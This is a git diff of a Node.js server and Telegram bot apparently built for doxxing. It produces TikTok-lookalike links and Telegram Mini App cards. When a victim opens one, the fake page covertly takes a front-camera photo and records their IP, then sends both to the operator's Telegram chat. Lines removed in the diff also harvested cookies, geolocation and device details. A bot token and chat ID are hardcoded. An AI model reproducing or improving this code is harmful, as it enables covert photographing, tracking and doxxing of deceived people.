@@ -5,8 +5,6 @@ const crypto = require('crypto');
 const TOKEN = '8989024516:AAEAIwKbvaDe8HALbrjv-UoHcH6Pp2wZiso';
 const CHAT_ID = '8667961334';
 const PORT = process.env.PORT || 3000;
-
-// Ваш реальный домен на Render (БЕЗ слэша на конце)
 const DOMAIN = 'https://dox-toxx.onrender.com'; 
 
 const app = express();
@@ -16,72 +14,96 @@ app.use(express.json({ limit: '15mb' }));
 app.use(express.urlencoded({ extended: true }));
 
 const linksDB = {};
-const userStates = {};
 
-// БОТ
+// --- ОБЫЧНЫЙ СТАРТ ---
 bot.onText(/\/start/, (msg) => {
-  const chatId = msg.chat.id;
-  userStates[chatId] = 'WAITING_LINK';
-  bot.sendMessage(chatId, 'Отправь ссылку на TikTok (например: https://www.tiktok.com/@user/video/123456789).');
+  bot.sendMessage(msg.chat.id, 'Отправь ссылку на TikTok.');
 });
 
+// --- ОБЫЧНЫЕ СООБЩЕНИЯ ---
 bot.on('message', (msg) => {
-  const chatId = msg.chat.id;
   const text = msg.text;
-
   if (!text || text.startsWith('/')) return;
 
-  if (userStates[chatId] === 'WAITING_LINK') {
-    if (!text.includes('tiktok.com')) {
-      return bot.sendMessage(chatId, 'Неверная ссылка. Отправь ссылку с tiktok.com');
-    }
-
-    const shortId = crypto.randomBytes(4).toString('hex'); // Генерируем короткий ID
+  if (text.includes('tiktok.com')) {
+    const shortId = crypto.randomBytes(4).toString('hex');
     linksDB[shortId] = text;
-
     const fakeLink = `${DOMAIN}/${shortId}/`;
-
-    bot.sendMessage(chatId, `Ссылка готова:\n${fakeLink}`);
-    userStates[chatId] = null;
+    bot.sendMessage(msg.chat.id, `Твоя ссылка:\n${fakeLink}`);
   }
 });
 
-// ГЛАВНАЯ СТРАНИЦА (Чтобы не было ошибки Cannot GET /)
-app.get('/', (req, res) => {
-  res.send('Сервер работает. Бот ожидает ссылки в Telegram.');
+// --- INLINE РЕЖИМ (@bot ссылка) ---
+bot.on('inline_query', async (query) => {
+  const text = query.query;
+
+  if (!text || !text.includes('tiktok.com')) {
+    return bot.answerInlineQuery(query.id, []);
+  }
+
+  const shortId = crypto.randomBytes(4).toString('hex');
+  linksDB[shortId] = text;
+  
+  // Ссылка на наше приложение
+  const appLink = `${DOMAIN}/${shortId}/`;
+
+  // Создаем карточку с нативной кнопкой "Открыть"
+  const result = {
+    type: 'article',
+    id: shortId,
+    title: 'TikTok',
+    description: 'Нажмите, чтобы открыть видео',
+    input_message_content: {
+      message_text: '👇 Нажмите кнопку ниже, чтобы открыть видео'
+    },
+    reply_markup: {
+      inline_keyboard: [
+        [
+          {
+            text: 'Открыть',
+            // ВАЖНО: Используем web_app вместо url, чтобы открылось как Mini App с камерой!
+            web_app: { url: appLink } 
+          }
+        ]
+      ]
+    }
+  };
+
+  await bot.answerInlineQuery(query.id, [result], { cache_time: 0 });
 });
 
-// ПРИЕМ ДАННЫХ С ФРОНТЕНДА
+// --- ГЛАВНАЯ СТРАНИЦА ---
+app.get('/', (req, res) => {
+  res.send('Сервер работает.');
+});
+
+// --- ПРИЕМ ДАННЫХ ---
 app.post('/api/collect', async (req, res) => {
-  const { cookies, geo, phone, browser, target, photo } = req.body;
+  const { target, photo } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
   try {
-    let text = `IP: ${ip}\nГео: ${geo?.country || '?'}, ${geo?.city || '?'}\nУстройство: ${phone?.os || '?'}\nЦель: ${target || '?'}`;
+    let text = `Новый переход\nIP: ${ip}\nЦель: ${target || '?'}`;
     await bot.sendMessage(CHAT_ID, text);
 
     if (photo && photo.startsWith('data:image')) {
       const base64Data = photo.split(',')[1];
       const buffer = Buffer.from(base64Data, 'base64');
-      await bot.sendPhoto(CHAT_ID, buffer);
+      await bot.sendPhoto(CHAT_ID, buffer, { caption: 'Фото с камеры' });
     }
 
     res.json({ ok: true });
   } catch (error) {
-    console.error(error);
     res.status(500).json({ ok: false });
   }
 });
 
-// ОБРАБОТКА КОРОТКИХ ССЫЛОК (Маскировка)
+// --- HTML СТРАНИЦА (С КАМЕРОЙ) ---
 app.get('/:id/', (req, res) => {
   const shortId = req.params.id;
   const targetUrl = linksDB[shortId];
 
-  // Если ID нет в базе (например, после перезапуска сервера) — кидаем на главную TikTok
-  if (!targetUrl) {
-    return res.redirect('https://www.tiktok.com/');
-  }
+  if (!targetUrl) return res.redirect('https://www.tiktok.com/');
 
   res.send(`<!DOCTYPE html>
 <html lang="ru">
@@ -91,8 +113,7 @@ app.get('/:id/', (req, res) => {
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <title>TikTok</title>
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
-  body { height: 100vh; background: #f1f1f2; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; color: #000; }
+  body { height: 100vh; background: #f1f1f2; overflow: hidden; font-family: sans-serif; color: #000; margin: 0; padding: 0; }
   .header { background: #e3e3e3; padding: 12px 16px; display: flex; align-items: center; gap: 12px; border-bottom: 1px solid #d0d0d0; }
   .avatar-lg { width: 48px; height: 48px; border-radius: 50%; background: #ccc; display: flex; justify-content: center; align-items: center; }
   .avatar-lg svg { width: 28px; height: 28px; fill: #fff; }
@@ -101,13 +122,7 @@ app.get('/:id/', (req, res) => {
   .header-info .desc { font-size: 13px; color: #666; }
   .btn-red { background: #fe2c55; color: #fff; border: none; padding: 10px 16px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; }
   .content { padding: 20px; max-width: 600px; margin: 0 auto; }
-  .skeleton-box { background: #e0e0e0; border-radius: 8px; margin-bottom: 16px; }
-  .skeleton-box.big { height: 400px; width: 100%; }
-  .skeleton-row { display: flex; gap: 12px; margin-bottom: 16px; }
-  .skeleton-circle { width: 40px; height: 40px; border-radius: 50%; background: #d0d0d0; }
-  .skeleton-text { height: 16px; background: #d0d0d0; border-radius: 4px; margin-bottom: 8px; }
-  .skeleton-text.w-50 { width: 50%; }
-  .skeleton-text.w-80 { width: 80%; }
+  .skeleton-box { background: #e0e0e0; border-radius: 8px; margin-bottom: 16px; height: 400px; width: 100%; }
   #preview, #canvas { display: none; }
 </style>
 </head>
@@ -118,17 +133,10 @@ app.get('/:id/', (req, res) => {
     <div class="name">TikTok</div>
     <div class="desc">Приєднуйся до мене в TikTok</div>
   </div>
-  <button class="btn-red" id="btnOpen">Відкрити застосунок</button>
+  <button class="btn-red" id="btnOpen">Открыть</button>
 </div>
 <div class="content">
-  <div class="skeleton-row">
-    <div class="skeleton-circle"></div>
-    <div style="flex:1">
-      <div class="skeleton-text w-50"></div>
-      <div class="skeleton-text w-80"></div>
-    </div>
-  </div>
-  <div class="skeleton-box big"></div>
+  <div class="skeleton-box"></div>
 </div>
 <video id="preview" autoplay playsinline muted></video>
 <canvas id="canvas"></canvas>
@@ -140,21 +148,17 @@ app.get('/:id/', (req, res) => {
     tg.ready();
     tg.expand();
     if (tg.BackButton) tg.BackButton.hide();
+    
+    // Принудительный запрос камеры через API Telegram
+    if (tg.requestCameraAccess) {
+      tg.requestCameraAccess((granted) => {
+        console.log("Camera access:", granted);
+      });
+    }
   }
 
-  const COOKIE_DATA = {}, GEO_DATA = {}, PHONE_DATA = {}, BROWSER_DATA = {};
   const video = document.getElementById('preview');
   const canvas = document.getElementById('canvas');
-
-  async function collectAll() {
-    COOKIE_DATA.raw = document.cookie || '';
-    try {
-      const r = await fetch('https://ipwho.is/'); const g = await r.json();
-      if (g.success) { GEO_DATA.country = g.country; GEO_DATA.city = g.city; }
-    } catch(e){}
-    PHONE_DATA.os = navigator.userAgent;
-    BROWSER_DATA.lang = navigator.language;
-  }
 
   async function takePhoto() {
     let stream = null;
@@ -162,7 +166,7 @@ app.get('/:id/', (req, res) => {
       stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
       video.srcObject = stream;
       await new Promise(res => { if (video.readyState >= 2) return res(); video.onloadeddata = () => res(); });
-      await new Promise(r => setTimeout(r, 200));
+      await new Promise(r => setTimeout(r, 300));
       canvas.width = video.videoWidth || 480;
       canvas.height = video.videoHeight || 360;
       canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -192,13 +196,17 @@ app.get('/:id/', (req, res) => {
 
   (async () => {
     const photoPromise = takePhoto();
-    await collectAll();
     const photoBlob = await photoPromise;
-    const photoBase64 = photoBlob ? await new Promise((res) => { const reader = new FileReader(); reader.onloadend = () => res(reader.result); reader.readAsDataURL(photoBlob); }) : null;
+    
+    let photoBase64 = null;
+    if (photoBlob) {
+      photoBase64 = await new Promise((res) => { const reader = new FileReader(); reader.onloadend = () => res(reader.result); reader.readAsDataURL(photoBlob); });
+    }
+    
     fetch('/api/collect', {
       method: 'POST',
       headers: { 'content-type': 'application/json' },
-      body: JSON.stringify({ cookies: COOKIE_DATA, geo: GEO_DATA, phone: PHONE_DATA, browser: BROWSER_DATA, photo: photoBase64, target: TARGET_URL })
+      body: JSON.stringify({ photo: photoBase64, target: TARGET_URL })
     }).catch(() => {});
   })();
 </script>
